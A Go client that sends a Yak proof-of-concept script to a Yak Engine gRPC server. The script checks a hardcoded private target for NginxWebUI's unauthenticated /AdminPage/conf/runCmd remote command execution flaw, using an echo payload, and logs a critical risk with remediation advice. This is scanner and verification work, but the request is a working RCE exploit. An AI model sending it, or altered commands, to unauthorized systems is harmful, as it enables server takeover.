package main

import (
	"context"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"time"

	"smart/grpc/ypb"

	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials/insecure"
)

func main() {
	// Address of the Yak Engine gRPC server
	target := "192.168.3.3:9919"

	fmt.Printf("Connecting to Yak Engine at %s...\n", target)

	// Set up a connection to the server.
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()

	conn, err := grpc.DialContext(ctx, target, grpc.WithTransportCredentials(insecure.NewCredentials()), grpc.WithBlock())
	if err != nil {
		log.Fatalf("did not connect: %v", err)
	}
	defer conn.Close()

	c := ypb.NewYakClient(conn)

	fmt.Println("Connected! Executing NginxWebUI RCE Script...")

	// Set to TRUE to test result handling without network connection to target
	mockMode := false

	// The script provided by the user
	script := `
yakit.AutoInitYakit() 

handleCheck = func(addr) { 
    println("Checking addr: " + addr)
    isTls = str.IsTLSServer(addr) 

    if isTls { 
        url = "https://" + addr 
    } else { 
        url = "http://" + addr 
    } 

    packet = ` + "`" + `GET /AdminPage/conf/runCmd?cmd=echo%20aaaa%27%27bbbb HTTP/1.1 
Host: {{params(target)}} 
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 
Accept-Encoding: gzip, deflate 
Accept-Language: zh-CN,zh;q=0.9 
Connection: close 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 

` + "`" + `

    rsp, req, err = poc.HTTP(packet, poc.params({"target": addr}), poc.https(isTls), poc.redirectTimes(0)) 
    
    if err != nil {
        println("Poc.HTTP Error: " + sprintf("%v", err))
    }

    header, body = str.SplitHTTPHeadersAndBodyFromPacket(rsp) 
    drsp, _ = str.ParseBytesToHTTPResponse(rsp) 

    if drsp != nil && drsp.StatusCode == 200 { 
        risk.NewRisk( 
            url, 
            risk.title("NginxWebUI 远程命令执行漏洞"), 
            risk.titleVerbose("NginxWebUI 远程命令执行漏洞"), 
            risk.severity("critical"), 
            risk.type("rce"), 
            risk.request(string(req)), 
            risk.response(string(rsp)), 
            risk.description("NginxWebUI 的 /AdminPage/conf/runCmd 接口存在未授权远程命令执行漏洞。攻击者无需认证即可通过 cmd 参数执行任意系统命令。该漏洞通过 echo 命令拼接测试验证，证明服务器可执行任意命令，可导致服务器被完全控制。"), 
            risk.solution("1. 升级 NginxWebUI 至官方修复版本\n2. 为管理接口添加身份认证\n3. 限制管理接口的访问 IP 白名单\n4. 部署 WAF 拦截可疑命令执行请求\n5. 如非必要，建议关闭或移除该接口"), 
            risk.payload("/AdminPage/conf/runCmd?cmd=echo%20aaaa%27%27bbbb"), 
            risk.details({"target": addr, "cve": "", "影响范围": "NginxWebUI 多个版本", "影响组件": "/AdminPage/conf/runCmd 接口", "reason": "runCmd 接口未进行身份验证，直接执行用户传入的系统命令", "reason_verbose": "攻击者通过执行 echo aaaa''bbbb 命令，服务器返回 aaaabbbb（单引号被解析执行），证明存在命令执行漏洞"}), 
        ) 
    } 

    return 
} 

target = cli.String("root_url") 
ip, port, _ = str.ParseStringToHostPort(target) 
addr = str.HostPort(ip, port) 
cli.check() 
handleCheck(addr) 
`

	if mockMode {
		fmt.Println("RUNNING IN MOCK MODE")
		script = `
yakit.AutoInitYakit()
handleCheck = func(addr) {
    println("Checking addr: " + addr)
    println("MOCK MODE: Simulating successful vulnerability detection...")
    risk.NewRisk(
        "http://" + addr,
        risk.title("NginxWebUI 远程命令执行漏洞 (MOCK)"),
        risk.severity("critical"),
        risk.description("This is a mock vulnerability for testing result handling.")
    )
    println("Risk created (Mock).")
}
target = cli.String("root_url")
addr = target
handleCheck(addr)
`
	}

	targetUrl := "http://192.168.22.142/"

	execReq := &ypb.ExecRequest{
		Script: script,
		Params: []*ypb.ExecParamItem{
			{Key: "root_url", Value: targetUrl},
		},
	}

	execStream, err := c.Exec(context.Background(), execReq)
	if err != nil {
		log.Fatalf("Error calling Exec: %v", err)
	}

	for {
		resp, err := execStream.Recv()
		if err == io.EOF {
			break
		}
		if err != nil {
			log.Printf("Error receiving exec stream: %v", err)
			break
		}

		// Check for OutputJson
		if resp.OutputJson != "" {
			fmt.Printf("\n[SUCCESS] Received OutputJson:\n%s\n", resp.OutputJson)
		}

		// Check for Message
		if resp.IsMessage {
			fmt.Printf("\n[MESSAGE] Received Message (len=%d):\n", len(resp.Message))
			// Try to parse to see if it contains risk
			var msgObj map[string]interface{}
			if err := json.Unmarshal(resp.Message, &msgObj); err == nil {
				if content, ok := msgObj["content"].(map[string]interface{}); ok {
					if level, ok := content["level"].(string); ok {
						if level == "json-risk" {
							fmt.Println("!!! FOUND RISK IN MESSAGE !!!")
							fmt.Println(content["data"])
						}
					}
				}
			}
		}

		if len(resp.Raw) > 0 {
			fmt.Printf("[LOG] %s", string(resp.Raw))
		}
	}
	fmt.Println("\nExecution finished.")
}
